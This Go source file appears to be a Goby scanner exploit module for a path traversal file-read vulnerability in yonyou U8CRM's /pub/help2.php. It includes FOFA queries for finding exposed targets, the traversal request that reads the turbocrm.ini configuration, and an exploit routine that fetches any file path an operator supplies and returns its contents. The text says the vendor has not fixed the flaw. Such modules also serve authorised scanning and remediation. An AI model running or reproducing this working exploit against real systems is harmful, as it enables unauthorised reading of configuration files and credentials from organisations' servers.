package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8CRM /pub/help2.php File Read Vulnerability",
    "Description": "<p>UFIDA U8CRM is a Customer Relationship Management (CRM) system developed by UFIDA Software to help companies manage customer relationships. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Product": "yonyou-U8CRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-06-24",
    "PostTime": "2024-06-24",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"用友U8CRM\" && body=\"/js/ext/adapter/ext/ext-base.js\"",
    "GobyQuery": "title=\"用友U8CRM\" && body=\"/js/ext/adapter/ext/ext-base.js\"",
    "Level": "1",
    "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.</p>",
    "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "turbocrm.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/../../tsvr/turbocrm.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/pub/help2.php?key=/../../tsvr/turbocrm.ini",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.9",
    "Translation": {
        "CN": {
            "Name": "用友U8CRM /pub/help2.php 文件读取漏洞",
            "Product": "用友U8CRM",
            "Description": "<p>用友U8CRM是一款由用友软件开发的客户关系管理系统（CRM），旨在帮助企业管理客户关系。攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "yonyou-U8CRM /pub/help2.php File Read Vulnerability",
            "Product": "yonyou-U8CRM",
            "Description": "<p>UFIDA U8CRM is a Customer Relationship Management (CRM) system developed by UFIDA Software to help companies manage customer relationships. The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "Recommendation": "<p>Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>The vulnerability allows an attacker to read important system files (e.g., database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure web site.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10963"
}`

	postOrGet_AAAAA1719198776 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/pub/help2.php?key="+fileUrl+""
		resp, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "<div id=\"maincontent\">") {
			return "", err
		}
		re := regexp.MustCompile(`<div id=\"maincontent\">([\s\S]*)</div>`)
		respTxt := re.FindStringSubmatch(resp.RawBody)[1]
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/pub/help2.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/../../tsvr/turbocrm.ini": "Hosts=127.0.0.1",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA1719198776

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"turbocrm.ini": {"/../../tsvr/turbocrm.ini", "Hosts=127.0.0.1"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA1719198776

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
